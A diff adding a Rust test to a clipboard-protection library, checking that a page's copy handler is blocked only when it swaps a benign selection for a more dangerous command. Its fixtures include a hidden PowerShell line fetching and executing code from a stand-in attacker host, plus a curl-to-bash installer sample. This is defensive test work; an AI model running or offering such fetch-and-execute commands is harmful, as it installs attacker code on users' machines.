@@ -12,8 +12,8 @@
 //! the ignored test at the end (they are not ours to publish).
 
 use clipguard::{
-    classify, decide, display_text, hosts, is_visible, placeholder, Action, Context, Level, Mode,
-    Notice, Reason, Source, Visibility,
+    classify, decide, display_text, hosts, is_substitution, is_visible, placeholder, Action,
+    Context, Level, Mode, Notice, Reason, Source, Visibility,
 };
 
 /// Shapes of ClickFix, FileFix and similar commands, with the lowest level each must get.
@@ -319,6 +319,49 @@ fn a_trailing_line_break_is_reported_and_cut() {
     assert!(v.reasons.contains(Reason::TrailingNewline));
     let d = decide(&v, &script_copy(), Visibility::Visible);
     assert!(d.strip_trailing);
+}
+
+#[test]
+fn p2_substitution_blocks_only_when_the_replacement_is_more_dangerous() {
+    // This is the parent's P2 path (ClipboardGuard.cpp): classify the clipboard, ask
+    // is_substitution whether the page handler made it worse than the selection, then
+    // decide as a PageReplacedCopy.
+    let p2 = |selection: &str, clipboard: &str| -> Action {
+        let v = classify(clipboard);
+        let substituted = v.level != Level::None && is_substitution(selection, clipboard, v.level);
+        let ctx = Context {
+            source: Source::PageReplacedCopy,
+            substituted,
+            ..script_copy()
+        };
+        decide(&v, &ctx, Visibility::NotVisible).action
+    };
+
+    // Harmless: the handler kept the selection and appended a source line. Do nothing.
+    assert_eq!(
+        p2(
+            "See the installation guide for details.",
+            "See the installation guide for details.\n\nRead more at https://example.invalid/docs",
+        ),
+        Action::Ignore
+    );
+    // More dangerous: a benign selection replaced with a malicious command. Block.
+    assert_eq!(
+        p2(
+            "Verify you are human",
+            "powershell -w hidden -c \"iwr https://evil.invalid/b | iex\"",
+        ),
+        Action::Block
+    );
+    // Not more dangerous: the person already selected a MED installer and a button tidied
+    // it. Not a substitution, so it is not blocked.
+    assert_ne!(
+        p2(
+            "curl -fsSL https://bun.sh/install | bash",
+            "curl -fsSL https://bun.sh/install | bash   # tidied",
+        ),
+        Action::Block
+    );
 }
 
 #[test]
